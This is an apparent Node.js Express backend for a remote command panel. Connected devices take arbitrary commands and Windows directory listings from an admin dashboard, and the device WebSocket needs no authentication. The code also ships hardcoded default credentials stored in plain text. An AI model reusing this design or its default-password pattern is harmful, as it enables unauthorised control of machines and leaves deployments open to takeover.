const express = require("express");
const expressWs = require("express-ws");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");

const {processCommand} = require("./cmd.js");
const {Server} = require("./server.js");
const {Client} = require("./client.js");
const {
  listShortcuts,
  createShortcut,
  updateShortcut,
  deleteShortcut,
} = require("./shortcuts");
const utils = require("./utils.js");

const PORT = 5599;
const SESSION_COOKIE = "remosrv_admin";
const SESSION_TTL_MS = 12 * 60 * 60 * 1000;

const ROOT_DIR = path.resolve(__dirname, "..");
const ASSETS_DIR = path.join(ROOT_DIR, "public", "assets");
const PAGES_DIR = path.join(ROOT_DIR, "pages");
const CONFIG_DIR = path.join(ROOT_DIR, "config");
const AUTH_CONFIG_FILE = path.join(CONFIG_DIR, "admin-auth.json");

const sessions = new Map();

function ensureAuthConfig() {
  if (!fs.existsSync(CONFIG_DIR)) {
    fs.mkdirSync(CONFIG_DIR, {recursive: true});
  }
  if (!fs.existsSync(AUTH_CONFIG_FILE)) {
    const bootstrap = {
      username: "admin",
      password: "admin123",
    };
    fs.writeFileSync(AUTH_CONFIG_FILE, JSON.stringify(bootstrap, null, 2), "utf8");
    console.log(`[Auth] Created ${AUTH_CONFIG_FILE}. Please change default password.`);
  }
}

function loadAuthConfig() {
  ensureAuthConfig();
  try {
    const raw = fs.readFileSync(AUTH_CONFIG_FILE, "utf8");
    const parsed = JSON.parse(raw);
    const username = typeof parsed.username === "string" ? parsed.username.trim() : "";
    const password = typeof parsed.password === "string" ? parsed.password : "";
    if (!username || !password) {
      throw new Error("username/password missing in auth config");
    }
    return {username, password};
  } catch (err) {
    throw new Error(`Failed to load auth config: ${String(err.message || err)}`);
  }
}

function parseCookies(cookieHeader) {
  const text = String(cookieHeader || "");
  const out = {};
  for (const chunk of text.split(";")) {
    const idx = chunk.indexOf("=");
    if (idx <= 0) continue;
    const key = chunk.slice(0, idx).trim();
    const value = chunk.slice(idx + 1).trim();
    out[key] = decodeURIComponent(value);
  }
  return out;
}

function createSession(username) {
  const token = crypto.randomBytes(24).toString("hex");
  sessions.set(token, {
    username,
    expiresAt: Date.now() + SESSION_TTL_MS,
  });
  return token;
}

function removeSession(token) {
  if (!token) return;
  sessions.delete(token);
}

function getSessionFromReq(req) {
  const cookies = parseCookies(req.headers.cookie);
  const token = cookies[SESSION_COOKIE];
  if (!token) return null;
  const session = sessions.get(token);
  if (!session) return null;
  if (session.expiresAt <= Date.now()) {
    sessions.delete(token);
    return null;
  }
  return {token, session};
}

function requireAdminAuth(req, res, next) {
  const auth = getSessionFromReq(req);
  if (!auth) {
    if (req.path.startsWith("/api/")) {
      return res.status(401).json({ok: false, message: "unauthorized"});
    }
    return res.redirect("/login");
  }
  req.admin = auth.session;
  next();
}

function ensureAuthedWs(req, ws) {
  const auth = getSessionFromReq(req);
  if (!auth) {
    ws.close();
    return null;
  }
  return auth.session;
}

function normalizeWindowsPath(pathValue) {
  const raw = String(pathValue == null ? "" : pathValue).trim();
  if (!raw) {
    return "C:\\";
  }
  return raw.replace(/\//g, "\\");
}

function parseWindowsDirOutput(output) {
  const lines = String(output || "")
    .split(/\r?\n/)
    .map((line) => line.trimEnd());
  const entries = [];
  let cwd = "";

  for (const line of lines) {
    const enCwd = line.match(/^ Directory of (.+)$/i);
    if (enCwd) {
      cwd = enCwd[1].trim();
      continue;
    }

    const cnCwd = line.match(/^(.*)\s+的目录$/);
    if (cnCwd) {
      cwd = cnCwd[1].trim();
      continue;
    }

    const m = line.match(/^(\d{4}\/\d{2}\/\d{2}|\d{2}\/\d{2}\/\d{4})\s+(\d{2}:\d{2}(?:\s+[AP]M)?)\s+(<DIR>|[\d,]+)\s+(.+)$/i);
    if (!m) continue;

    const flag = m[3].toUpperCase();
    const name = m[4].trim();
    if (name === "." || name === "..") continue;

    entries.push({
      name,
      kind: flag === "<DIR>" ? "dir" : "file",
      size: flag === "<DIR>" ? null : Number(String(m[3]).replace(/,/g, "")),
    });
  }

  return {cwd, entries};
}

const app = express();
app.use(express.json());
app.use("/assets", express.static(ASSETS_DIR));

expressWs(app);

app.ws("/ws", (ws, req) => {
  utils.log("New Connection");
  const clientIp = req.ip || req.socket.remoteAddress;
  const client = new Client(ws, clientIp, Date.now());
  Server.add(client);
});

app.ws("/admin/ws", (ws, req) => {
  const admin = ensureAuthedWs(req, ws);
  if (!admin) return;
  utils.log(`New Admin Connection: ${admin.username}`);
  Server.addAdmin(ws);
  ws.send(
    JSON.stringify({
      type: "init",
      payload: {
        stats: Server.getStats(),
        activity: Server.getRecentActivity(),
        shortcuts: listShortcuts(),
      },
    })
  );
  ws.on("close", () => {
    Server.deleteAdmin(ws);
  });
});

app.get("/login", (req, res) => {
  const auth = getSessionFromReq(req);
  if (auth) {
    return res.redirect("/");
  }
  return res.sendFile(path.join(PAGES_DIR, "login.html"));
});

app.post("/auth/login", (req, res) => {
  try {
    const config = loadAuthConfig();
    const username = (req.body && typeof req.body.username === "string") ? req.body.username.trim() : "";
    const password = (req.body && typeof req.body.password === "string") ? req.body.password : "";

    if (username !== config.username || password !== config.password) {
      return res.status(401).json({ok: false, message: "账号或密码错误"});
    }

    const token = createSession(username);
    res.setHeader(
      "Set-Cookie",
      `${SESSION_COOKIE}=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${Math.floor(
        SESSION_TTL_MS / 1000
      )}`
    );
    return res.json({ok: true});
  } catch (err) {
    return res.status(500).json({ok: false, message: String(err.message || err)});
  }
});

app.post("/auth/logout", requireAdminAuth, (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  removeSession(cookies[SESSION_COOKIE]);
  res.setHeader("Set-Cookie", `${SESSION_COOKIE}=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`);
  res.json({ok: true});
});

app.get("/auth/me", requireAdminAuth, (req, res) => {
  res.json({ok: true, username: req.admin.username});
});

app.get("/", requireAdminAuth, (req, res) => {
  res.sendFile(path.join(PAGES_DIR, "dashboard.html"));
});

app.get("/files", requireAdminAuth, (req, res) => {
  res.sendFile(path.join(PAGES_DIR, "files.html"));
});

app.get("/status", (req, res) => {
  res.send("normal");
});

app.get("/gift", (req, res) => {
  res.send("请稍等...");
  console.log("GIFTTTTT");
});

app.get("/api/overview", requireAdminAuth, (req, res) => {
  res.json(Server.getStats());
});

app.post("/api/commands", requireAdminAuth, (req, res) => {
  const command = req.body && typeof req.body.command === "string" ? req.body.command.trim() : "";
  if (!command) {
    return res.status(400).json({ok: false, message: "command is required"});
  }
  const result = processCommand(command);
  Server.recordActivity("command", {source: "web", command, result});
  Server.broadcastToAdmins("stats", Server.getStats());
  if (!result || result.ok === false) {
    return res.status(400).json({ok: false, result});
  }
  return res.json({ok: true, result});
});

app.post("/api/files/list", requireAdminAuth, async (req, res) => {
  try {
    const ip = req.body && typeof req.body.ip === "string" ? req.body.ip.trim() : "";
    const requestedPath = req.body && typeof req.body.path === "string" ? req.body.path : "";
    if (!ip) {
      return res.status(400).json({ok: false, message: "ip is required"});
    }

    const client = Server.getClientByIp(ip);
    if (!client) {
      return res.status(404).json({ok: false, message: "device not found"});
    }

    const pathValue = normalizeWindowsPath(requestedPath);
    const escapedPath = pathValue.replace(/"/g, '""');
    const cmdLine = `#cd /d "${escapedPath}" && dir`;
    const sent = Server.sendToDevice(ip, cmdLine);
    if (!sent) {
      return res.status(409).json({ok: false, message: "device is offline"});
    }

    Server.recordActivity("command", {
      source: "web-file-browser",
      ip,
      command: cmdLine,
    });

    const output = await Server.waitDeviceMessage(ip, 10000, (message) => {
      const text = String(message || "");
      if (!text.trim()) return false;
      if (text.startsWith("Running:") || text.startsWith("Command execution completed:")) {
        return false;
      }
      return true;
    });

    if (String(output).startsWith("Cannot find method:")) {
      return res.status(400).json({
        ok: false,
        message: "Device rejected file browser command",
        detail: String(output),
      });
    }

    const parsed = parseWindowsDirOutput(output);
    return res.json({
      ok: true,
      ip,
      path: parsed.cwd || pathValue,
      entries: parsed.entries,
      raw: output,
    });
  } catch (err) {
    return res.status(504).json({
      ok: false,
      message: "No directory output returned by device",
      detail: String(err && err.message ? err.message : err),
    });
  }
});

app.get("/api/shortcuts", requireAdminAuth, (req, res) => {
  res.json({items: listShortcuts()});
});

app.post("/api/shortcuts", requireAdminAuth, (req, res) => {
  const name = req.body && typeof req.body.name === "string" ? req.body.name.trim() : "";
  const command = req.body && typeof req.body.command === "string" ? req.body.command.trim() : "";
  if (!name || !command) {
    return res.status(400).json({ok: false, message: "name and command are required"});
  }
  const item = createShortcut(name, command);
  Server.broadcastToAdmins("shortcuts", {items: listShortcuts()});
  return res.status(201).json({ok: true, item});
});

app.put("/api/shortcuts/:id", requireAdminAuth, (req, res) => {
  const id = req.params.id;
  const name = req.body && typeof req.body.name === "string" ? req.body.name.trim() : "";
  const command = req.body && typeof req.body.command === "string" ? req.body.command.trim() : "";
  if (!name || !command) {
    return res.status(400).json({ok: false, message: "name and command are required"});
  }
  const item = updateShortcut(id, name, command);
  if (!item) {
    return res.status(404).json({ok: false, message: "shortcut not found"});
  }
  Server.broadcastToAdmins("shortcuts", {items: listShortcuts()});
  return res.json({ok: true, item});
});

app.delete("/api/shortcuts/:id", requireAdminAuth, (req, res) => {
  const id = req.params.id;
  const ok = deleteShortcut(id);
  if (!ok) {
    return res.status(404).json({ok: false, message: "shortcut not found"});
  }
  Server.broadcastToAdmins("shortcuts", {items: listShortcuts()});
  return res.json({ok: true});
});

app.listen(PORT, () => {
  loadAuthConfig();
  console.log(`Server is running on http://localhost:${PORT}`);
});

setInterval(() => {
  Server.pingAll();
}, 5000);

setInterval(() => {
  const now = Date.now();
  for (const [token, session] of sessions.entries()) {
    if (session.expiresAt <= now) {
      sessions.delete(token);
    }
  }
}, 60 * 1000);
